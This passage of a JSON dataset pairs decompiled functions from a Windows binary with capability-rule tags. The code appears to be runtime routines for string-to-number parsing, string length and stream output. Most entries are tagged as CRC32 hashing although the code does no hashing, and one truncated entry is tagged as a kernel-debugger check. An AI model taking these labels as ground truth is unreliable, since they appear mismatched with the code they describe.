        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045bec4)\n// WARNING: Removing unreachable block (ram,0x0045bedc)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.0045b924(int32_t arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint64_t uVar1;\n    uint16_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint32_t arg_8h_00;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_ch;\n    cVar3 = fcn.00453fe7();\n    if (cVar3 == '\\0') {\ncode_r0x0045b96d:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x0045b96d;\n    }\n    arg_8h_00 = *arg_ch;\n    arg_ch = arg_ch + 1;\n    if (*(arg_8h + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    while (iVar4 = fcn.00468d2e(arg_8h_00, 8),  iVar4 != 0) {\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    }\n    var_4h = arg_18h & 0xff;\n    if (arg_8h_00 == 0x2d) {\n        var_4h = var_4h | 2;\ncode_r0x0045b9de:\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    }\n    else if (arg_8h_00 == 0x2b) goto code_r0x0045b9de;\n    var_90h = 0x660;\n    var_84h = 0x1810;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x0045bce8;\n    uVar7 = arg_8h_00;\n    if (uVar7 < 0x30) goto code_r0x0045bc78;\n    iVar4 = 0x30;\n    if (uVar7 < 0x3a) {\ncode_r0x0045bb0d:\n        iVar4 = -iVar4;\ncode_r0x0045bc73:\n        iVar4 = arg_8h_00 + iVar4;\n        if (iVar4 == -1) goto code_r0x0045bc78;\ncode_r0x0045bc9d:\n        if (iVar4 == 0) {\n            uVar5 = *arg_ch;\n            if ((uVar5 == 0x78) || (uVar5 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                arg_8h_00 = arg_ch[1];\n                arg_ch = arg_ch + 2;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.0045372b(uVar5);\n                arg_ch = arg_ch + 1;\n            }\n            goto code_r0x0045bce8;\n        }\n    }\n    else {\n        if (uVar7 < 0xff10) {\n            if ((0x65f < uVar7) &&\n               ((iVar4 = var_90h,  uVar7 < 0x66a ||\n                ((iVar4 = 0x6f0,  0x6ef < uVar7 &&\n                 ((uVar7 < 0x6fa ||\n                  ((iVar4 = 0x966,  0x965 < uVar7 &&\n                   ((uVar7 < 0x970 ||\n                    ((iVar4 = 0x9e6,  0x9e5 < uVar7 &&\n                     ((uVar7 < 0x9f0 ||\n                      ((iVar4 = 0xa66,  0xa65 < uVar7 &&\n                       ((uVar7 < 0xa70 ||\n                        ((iVar4 = 0xae6,  0xae5 < uVar7 &&\n                         ((uVar7 < 0xaf0 ||\n                          ((iVar4 = 0xb66,  0xb65 < uVar7 &&\n                           ((uVar7 < 0xb70 ||\n                            ((iVar4 = 0xc66,  0xc65 < uVar7 &&\n                             ((uVar7 < 0xc70 ||\n                              ((iVar4 = 0xce6,  0xce5 < uVar7 &&\n                               ((uVar7 < 0xcf0 ||\n                                ((iVar4 = 0xd66,  0xd65 < uVar7 &&\n                                 ((uVar7 < 0xd70 ||\n                                  ((iVar4 = 0xe50,  0xe4f < uVar7 &&\n                                   ((uVar7 < 0xe5a ||\n                                    ((iVar4 = 0xed0,  0xecf < uVar7 &&\n                                     ((uVar7 < 0xeda ||\n                                      ((iVar4 = 0xf20,  0xf1f < uVar7 &&\n                                       ((uVar7 < 0xf2a ||\n                                        ((iVar4 = 0x1040,  0x103f < uVar7 &&\n                                         ((uVar7 < 0x104a ||\n                                          ((iVar4 = 0x17e0,  0x17df < uVar7 &&\n                                           ((uVar7 < 0x17ea || ((iVar4 = 0x1810,  0x180f < uVar7 && (uVar7 < 0x181a)))))\n                                           )))))))))))))))))))))))))))))))))))))))))))))))))))))))))\n            goto code_r0x0045bb0d;\n        }\n        else if (uVar7 < 0xff1a) {\n            iVar4 = -0xff10;\n            goto code_r0x0045bc73;\n        }\ncode_r0x0045bc78:\n        if (((0x40 < arg_8h_00) && (arg_8h_00 < 0x5b)) || (arg_8h_00 - 0x61 < 0x1a)) {\n            uVar5 = arg_8h_00;\n            if (arg_8h_00 - 0x61 < 0x1a) {\n                uVar5 = arg_8h_00 - 0x20;\n            }\n            iVar4 = uVar5 - 0x37;\n            goto code_r0x0045bc9d;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x0045bce8:\n    uVar8 = fcn.00476c00(0xffffffff, 0xffffffff, arg_14h, arg_14h >> 0x1f);\n    uVar1 = 0;\n    do {\n        iVar4 = uVar1 >> 0x20;\n        var_8h = uVar1;\n        uVar7 = arg_8h_00;\n        if (uVar7 < 0x30) goto code_r0x0045be73;\n        iVar6 = 0x30;\n        if (uVar7 < 0x3a) {\ncode_r0x0045be69:\n            uVar5 = arg_8h_00 - iVar6;\n            if (uVar5 == 0xffffffff) goto code_r0x0045be73;\n        }\n        else {\n            iVar6 = 0xff10;\n            if (uVar7 < 0xff10) {\n                if (0x65f < uVar7) {\n                    iVar6 = var_90h;\n                    if (uVar7 < 0x66a) goto code_r0x0045be69;\n                    iVar6 = 0x6f0;\n                    if (0x6ef < uVar7) {\n                        if (uVar7 < 0x6fa) goto code_r0x0045be69;\n                        iVar6 = 0x966;\n                        if (0x965 < uVar7) {\n                            if (uVar7 < 0x970) goto code_r0x0045be69;\n                            iVar6 = 0x9e6;\n                            if (0x9e5 < uVar7) {\n                                if (uVar7 < 0x9f0) goto code_r0x0045be69;\n                                iVar6 = 0xa66;\n                                if (0xa65 < uVar7) {\n                                    if (uVar7 < 0xa70) goto code_r0x0045be69;\n                                    iVar6 = 0xae6;\n                                    if (0xae5 < uVar7) {\n                                        if (uVar7 < 0xaf0) goto code_r0x0045be69;\n                                        iVar6 = 0xb66;\n                                        if (0xb65 < uVar7) {\n                                            if (uVar7 < 0xb70) goto code_r0x0045be69;\n                                            iVar6 = 0xc66;\n                                            if (0xc65 < uVar7) {\n                                                if (uVar7 < 0xc70) goto code_r0x0045be69;\n                                                iVar6 = 0xce6;\n                                                if (0xce5 < uVar7) {\n                                                    if (uVar7 < 0xcf0) goto code_r0x0045be69;\n                                                    iVar6 = 0xd66;\n                                                    if (0xd65 < uVar7) {\n                                                        if (uVar7 < 0xd70) goto code_r0x0045be69;\n                                                        iVar6 = 0xe50;\n                                                        if (0xe4f < uVar7) {\n                                                            if (uVar7 < 0xe5a) goto code_r0x0045be69;\n                                                            iVar6 = 0xed0;\n                                                            if (0xecf < uVar7) {\n                                                                if (uVar7 < 0xeda) goto code_r0x0045be69;\n                                                                iVar6 = 0xf20;\n                                                                if (0xf1f < uVar7) {\n                                                                    if (uVar7 < 0xf2a) goto code_r0x0045be69;\n                                                                    iVar6 = 0x1040;\n                                                                    if (0x103f < uVar7) {\n                                                                        if (uVar7 < 0x104a) goto code_r0x0045be69;\n                                                                        iVar6 = 0x17e0;\n                                                                        if (0x17df < uVar7) {\n                                                                            if (uVar7 < 0x17ea) goto code_r0x0045be69;\n                                                                            if (0x180f < uVar7) {\n                                                                                var_88h._0_2_ = 0x181a;\n                                                                                iVar6 = var_84h;\n                                                                                goto code_r0x0045be67;\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                var_8ch._0_2_ = 0xff1a;\n                var_88h._0_2_ = var_8ch;\ncode_r0x0045be67:\n                if (uVar7 < var_88h) goto code_r0x0045be69;\n            }\ncode_r0x0045be73:\n            if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                uVar5 = 0xffffffff;\n            }\n            else {\n                uVar5 = arg_8h_00;\n                if (arg_8h_00 - 0x61 < 0x1a) {\n                    uVar5 = arg_8h_00 - 0x20;\n                }\n                uVar5 = uVar5 - 0x37;\n            }\n        }\n        if (arg_14h <= uVar5) {\n            fcn.0045372b(arg_8h_00);\n            if ((var_4h & 8) == 0) {\n                if (arg_10h == NULL) {\n                    return 0;\n                }\n                *arg_10h = puVar2;\n                return 0;\n            }\n            cVar3 = fcn.0045ad90(var_4h, var_8h, iVar4);\n            if (cVar3 == '\\0') {\n                if ((var_4h & 2) != 0) {\n                    uVar1 = CONCAT44(-(iVar4 + (var_8h != 0)), -var_8h);\n                }\n            }\n            else {\n                *(arg_8h + 0x1c) = 1;\n                *(arg_8h + 0x18) = 0x22;\n                if ((var_4h & 1) != 0) {\n                    if ((var_4h & 2) == 0) {\n                        if (arg_10h != NULL) {\n                            *arg_10h = arg_ch;\n                        }\n                        return 0x7fffffffffffffff;\n                    }\n                    if (arg_10h != NULL) {\n                        *arg_10h = arg_ch;\n                    }\n                    return 0x8000000000000000;\n                }\n                uVar1 = 0xffffffffffffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n                return uVar1;\n            }\n            return uVar1;\n        }\n        uVar9 = fcn.00476ea0();\n        var_4h = var_4h | (uVar9 + 0x1c < uVar9 || uVar8 < uVar1) << 2 | 8;\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        uVar1 = uVar9 + 0x1c;\n    } while( true );\n}\n",
        "token_count": 3592
    },
    "0045d2b4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045d2b4(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar (*pauVar4) [32];\n    uchar auVar5 [16];\n    uchar auVar6 [32];\n    uchar in_YMM1 [32];\n    uint16_t uVar7;\n    \n    piVar1 = arg_8h;\n    if (*0x6ccba8 < 5) {\n        if (*0x6ccba8 < 1) {\n            for (; *piVar1 != 0; piVar1 = piVar1 + 1) {\n            }\n            return piVar1 - arg_8h >> 1;\n        }\n        if ((arg_8h & 1) == 0) {\n            uVar3 = (-((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf)) >> 1;\n            if (uVar3 <= arg_ch) {\n                arg_ch = uVar3;\n            }\n            piVar1 = arg_8h;\n            if (arg_8h != arg_8h + arg_ch) {\n                do {\n                    if (*piVar1 == 0) break;\n                    piVar1 = piVar1 + 1;\n                } while (piVar1 != arg_8h + arg_ch);\n            }\n            uVar3 = piVar1 - arg_8h >> 1;\n            if (uVar3 != arg_ch) {\n                return uVar3;\n            }\n            piVar1 = arg_8h + uVar3;\n            while( true ) {\n                uVar7 = -(piVar1[7] == 0);\n                auVar5 = CONCAT214(uVar7, CONCAT212(-(piVar1[6] == 0), \n                                                    CONCAT210(-(piVar1[5] == 0), \n                                                              CONCAT28(-(piVar1[4] == 0), \n                                                                       CONCAT26(-(piVar1[3] == 0), \n                                                                                CONCAT24(-(piVar1[2] == 0), \n                                                                                         CONCAT22(-(piVar1[1] == 0), \n                                                                                                  -(*piVar1 == 0))))))))\n                ;\n                if ((SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                     (uVar7 >> 7 & 1) << 0xe | uVar7 & 0x8000) != 0) break;\n                piVar1 = piVar1 + 8;\n            }\n            for (; *piVar1 != 0; piVar1 = piVar1 + 1) {\n            }\n            iVar2 = piVar1 - arg_8h;\n            goto code_r0x0045d2e0;\n        }\n        for (; *piVar1 != 0; piVar1 = piVar1 + 1) {\n        }\n    }\n    else {\n        if ((arg_8h & 1) == 0) {\n            uVar3 = (-((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f)) >> 1;\n            if (uVar3 <= arg_ch) {\n                arg_ch = uVar3;\n            }\n            if (arg_8h != arg_8h + arg_ch) {\n                do {\n                    if (*piVar1 == 0) break;\n                    piVar1 = piVar1 + 1;\n                } while (piVar1 != arg_8h + arg_ch);\n            }\n            uVar3 = piVar1 - arg_8h >> 1;\n            if (uVar3 != arg_ch) {\n                return uVar3;\n            }\n            pauVar4 = arg_8h + uVar3;\n            auVar5 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while (auVar6 = vpcmpeqw_avx2(ZEXT1632(auVar5), *pauVar4), \n                  (SUB321(auVar6 >> 7, 0) & 1 | (SUB321(auVar6 >> 0xf, 0) & 1) << 1 |\n                   (SUB321(auVar6 >> 0x17, 0) & 1) << 2 | (SUB321(auVar6 >> 0x1f, 0) & 1) << 3 |\n                   (SUB321(auVar6 >> 0x27, 0) & 1) << 4 | (SUB321(auVar6 >> 0x2f, 0) & 1) << 5 |\n                   (SUB321(auVar6 >> 0x37, 0) & 1) << 6 | (SUB321(auVar6 >> 0x3f, 0) & 1) << 7 |\n                   (SUB321(auVar6 >> 0x47, 0) & 1) << 8 | (SUB321(auVar6 >> 0x4f, 0) & 1) << 9 |\n                   (SUB321(auVar6 >> 0x57, 0) & 1) << 10 | (SUB321(auVar6 >> 0x5f, 0) & 1) << 0xb |\n                   (SUB321(auVar6 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar6 >> 0x6f, 0) & 1) << 0xd |\n                   (SUB321(auVar6 >> 0x77, 0) & 1) << 0xe | SUB321(auVar6 >> 0x7f, 0) << 0xf |\n                   (SUB321(auVar6 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar6 >> 0x8f, 0) & 1) << 0x11 |\n                   (SUB321(auVar6 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar6 >> 0x9f, 0) & 1) << 0x13 |\n                   (SUB321(auVar6 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar6 >> 0xaf, 0) & 1) << 0x15 |\n                   (SUB321(auVar6 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar6 >> 0xbf, 0) << 0x17 |\n                   (SUB321(auVar6 >> 199, 0) & 1) << 0x18 | (SUB321(auVar6 >> 0xcf, 0) & 1) << 0x19 |\n                   (SUB321(auVar6 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar6 >> 0xdf, 0) & 1) << 0x1b |\n                   (SUB321(auVar6 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar6 >> 0xef, 0) & 1) << 0x1d |\n                   (SUB321(auVar6 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar6 >> 0xff, 0) << 0x1f) == 0) {\n                pauVar4 = pauVar4[1];\n            }\n            for (; **pauVar4 != 0; pauVar4 = *pauVar4 + 2) {\n            }\n            vzeroupper_avx();\n            return pauVar4 - arg_8h >> 1;\n        }\n        for (; *piVar1 != 0; piVar1 = piVar1 + 1) {\n        }\n    }\n    iVar2 = piVar1 - arg_8h;\ncode_r0x0045d2e0:\n    return iVar2 >> 1;\n}\n",
        "token_count": 2182
    },
    "0045dbff": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045dbff(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar (*pauVar3) [32];\n    int16_t *piVar4;\n    int16_t *piVar5;\n    uint32_t uVar6;\n    uchar auVar7 [16];\n    uchar auVar8 [32];\n    uchar in_YMM1 [32];\n    uint16_t uVar9;\n    \n    piVar5 = arg_8h;\n    if (*0x6ccba8 < 5) {\n        if (*0x6ccba8 < 1) {\n            for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n            }\n        }\n        else {\n            if ((arg_8h & 1) != 0) {\n                for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n                }\n                goto code_r0x0045dc29;\n            }\n            uVar6 = -((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf);\n            piVar5 = arg_8h + (uVar6 & 0xfffffffe);\n            piVar4 = arg_8h;\n            if (arg_8h != piVar5) {\n                do {\n                    if (*piVar4 == 0) break;\n                    piVar4 = piVar4 + 1;\n                } while (piVar4 != piVar5);\n            }\n            uVar2 = piVar4 - arg_8h >> 1;\n            if (uVar2 != uVar6 >> 1) {\n                return uVar2;\n            }\n            piVar5 = arg_8h + uVar2;\n            while( true ) {\n                uVar9 = -(piVar5[7] == 0);\n                auVar7 = CONCAT214(uVar9, CONCAT212(-(piVar5[6] == 0), \n                                                    CONCAT210(-(piVar5[5] == 0), \n                                                              CONCAT28(-(piVar5[4] == 0), \n                                                                       CONCAT26(-(piVar5[3] == 0), \n                                                                                CONCAT24(-(piVar5[2] == 0), \n                                                                                         CONCAT22(-(piVar5[1] == 0), \n                                                                                                  -(*piVar5 == 0))))))))\n                ;\n                if ((SUB161(auVar7 >> 7, 0) & 1 | (SUB161(auVar7 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar7 >> 0x17, 0) & 1) << 2 | (SUB161(auVar7 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar7 >> 0x27, 0) & 1) << 4 | (SUB161(auVar7 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar7 >> 0x37, 0) & 1) << 6 | (SUB161(auVar7 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar7 >> 0x47, 0) & 1) << 8 | (SUB161(auVar7 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar7 >> 0x57, 0) & 1) << 10 | (SUB161(auVar7 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar7 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar7 >> 0x6f, 0) & 1) << 0xd |\n                     (uVar9 >> 7 & 1) << 0xe | uVar9 & 0x8000) != 0) break;\n                piVar5 = piVar5 + 8;\n            }\n            for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n            }\n        }\n        iVar1 = piVar5 - arg_8h;\n    }\n    else {\n        if ((arg_8h & 1) == 0) {\n            uVar6 = -((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f);\n            piVar5 = arg_8h + (uVar6 & 0xfffffffe);\n            piVar4 = arg_8h;\n            if (arg_8h != piVar5) {\n                do {\n                    if (*piVar4 == 0) break;\n                    piVar4 = piVar4 + 1;\n                } while (piVar4 != piVar5);\n            }\n            uVar2 = piVar4 - arg_8h >> 1;\n            if (uVar2 != uVar6 >> 1) {\n                return uVar2;\n            }\n            pauVar3 = arg_8h + uVar2;\n            auVar7 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while (auVar8 = vpcmpeqw_avx2(ZEXT1632(auVar7), *pauVar3), \n                  (SUB321(auVar8 >> 7, 0) & 1 | (SUB321(auVar8 >> 0xf, 0) & 1) << 1 |\n                   (SUB321(auVar8 >> 0x17, 0) & 1) << 2 | (SUB321(auVar8 >> 0x1f, 0) & 1) << 3 |\n                   (SUB321(auVar8 >> 0x27, 0) & 1) << 4 | (SUB321(auVar8 >> 0x2f, 0) & 1) << 5 |\n                   (SUB321(auVar8 >> 0x37, 0) & 1) << 6 | (SUB321(auVar8 >> 0x3f, 0) & 1) << 7 |\n                   (SUB321(auVar8 >> 0x47, 0) & 1) << 8 | (SUB321(auVar8 >> 0x4f, 0) & 1) << 9 |\n                   (SUB321(auVar8 >> 0x57, 0) & 1) << 10 | (SUB321(auVar8 >> 0x5f, 0) & 1) << 0xb |\n                   (SUB321(auVar8 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar8 >> 0x6f, 0) & 1) << 0xd |\n                   (SUB321(auVar8 >> 0x77, 0) & 1) << 0xe | SUB321(auVar8 >> 0x7f, 0) << 0xf |\n                   (SUB321(auVar8 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar8 >> 0x8f, 0) & 1) << 0x11 |\n                   (SUB321(auVar8 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar8 >> 0x9f, 0) & 1) << 0x13 |\n                   (SUB321(auVar8 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar8 >> 0xaf, 0) & 1) << 0x15 |\n                   (SUB321(auVar8 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar8 >> 0xbf, 0) << 0x17 |\n                   (SUB321(auVar8 >> 199, 0) & 1) << 0x18 | (SUB321(auVar8 >> 0xcf, 0) & 1) << 0x19 |\n                   (SUB321(auVar8 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar8 >> 0xdf, 0) & 1) << 0x1b |\n                   (SUB321(auVar8 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar8 >> 0xef, 0) & 1) << 0x1d |\n                   (SUB321(auVar8 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar8 >> 0xff, 0) << 0x1f) == 0) {\n                pauVar3 = pauVar3[1];\n            }\n            for (; **pauVar3 != 0; pauVar3 = *pauVar3 + 2) {\n            }\n            vzeroupper_avx();\n            return pauVar3 - arg_8h >> 1;\n        }\n        for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n        }\ncode_r0x0045dc29:\n        iVar1 = piVar5 - arg_8h;\n    }\n    return iVar1 >> 1;\n}\n",
        "token_count": 2170
    },
    "0045f2ee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0045f2ee(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if ((*(arg_ch + 0xc) >> 0xc & 1) == 0) {\n        iVar1 = fcn.0045efb0(arg_ch);\n        if ((iVar1 == -1) || (iVar1 = fcn.0045efb0(arg_ch),  iVar1 == -2)) {\n            iVar1 = 0x6cafb8;\n        }\n        else {\n            iVar1 = fcn.0045efb0(arg_ch);\n            uVar2 = fcn.0045efb0(arg_ch);\n            iVar1 = *((iVar1 >> 6) * 4 + 0x6cd630) + (uVar2 & 0x3f) * 0x38;\n        }\n        iVar3 = 0x6cafb8;\n        if ((*(iVar1 + 0x29) != '\\x02') && (*(iVar1 + 0x29) != '\\x01')) {\n            iVar1 = fcn.0045efb0(arg_ch);\n            if ((iVar1 != -1) && (iVar1 = fcn.0045efb0(arg_ch),  iVar1 != -2)) {\n                iVar1 = fcn.0045efb0(arg_ch);\n                uVar2 = fcn.0045efb0(arg_ch);\n                iVar3 = *((iVar1 >> 6) * 4 + 0x6cd630) + (uVar2 & 0x3f) * 0x38;\n            }\n            if (*(iVar3 + 0x28) < '\\0') {\n                iVar1 = fcn.0045eb63(&var_10h, &var_ch, 5, arg_8h, arg_10h);\n                if ((iVar1 == 0) && (iVar1 = 0,  0 < var_10h)) {\n                    do {\n                        iVar3 = fcn.0045f5ff(*(&var_ch + iVar1), arg_ch, arg_10h);\n                        if (iVar3 == -1) break;\n                        iVar1 = iVar1 + 1;\n                    } while (iVar1 < var_10h);\n                }\n                goto code_r0x0045f418;\n            }\n        }\n        fcn.0045f284(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        fcn.0045f284(arg_8h, arg_ch, arg_10h);\n    }\ncode_r0x0045f418:\n    fcn.004303e9(var_10h);\n    return;\n}\n",
        "token_count": 673
    },
    "0045f497": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.0045f497(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    bool bVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486c60, 0x10);\n    iVar5 = *(unaff_EBP + 0xc);\n    if (iVar5 == 0) {\n        iVar5 = *(unaff_EBP + 0x10);\n        *(iVar5 + 0x1c) = 1;\n        *(iVar5 + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, iVar5);\n    }\n    else {\n        *(unaff_EBP + -0x20) = 0;\n        fcn.0045f18d(iVar5);\n        *(unaff_EBP + -4) = 0;\n        if ((*(iVar5 + 0xc) >> 0xc & 1) == 0) {\n            uVar3 = fcn.0045efb0(iVar5);\n            if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n                *(unaff_EBP + -0x1c) = 0x6cafb8;\n            }\n            else {\n                *(unaff_EBP + -0x1c) = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x6cd630);\n            }\n            iVar4 = 0x6cafb8;\n            iVar5 = *(unaff_EBP + 0xc);\n            if (*(*(unaff_EBP + -0x1c) + 0x29) == '\\0') {\n                if ((uVar3 != 0xffffffff) && (uVar3 != 0xfffffffe)) {\n                    iVar4 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x6cd630);\n                }\n                if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x0045f553;\n            }\n            bVar1 = false;\n        }\n        else {\ncode_r0x0045f553:\n            bVar1 = true;\n        }\n        if (bVar1) {\n            uVar2 = fcn.0045f5ff(*(unaff_EBP + 8), iVar5, *(unaff_EBP + 0x10));\n            *(unaff_EBP + -0x20) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0045f5c3();\n            goto code_r0x0045f5ad;\n        }\n        iVar5 = *(unaff_EBP + 0x10);\n        *(iVar5 + 0x1c) = 1;\n        *(iVar5 + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, iVar5);\n        fcn.00432e80(0x6cade0, unaff_EBP + -0x10, 0xfffffffe);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x0045f5ad:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 907
    },
    "0045f801": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f801(uint arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    \n    if ((arg_8h != '\\0') && (puVar1 = arg_ch + 3,  (*puVar1 >> 9 & 1) != 0)) {\n        fcn.00464908(arg_ch, arg_10h);\n        LOCK();\n        *puVar1 = *puVar1 & 0xfffffd7f;\n        arg_ch[6] = 0;\n        arg_ch[1] = 0;\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00460a84": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
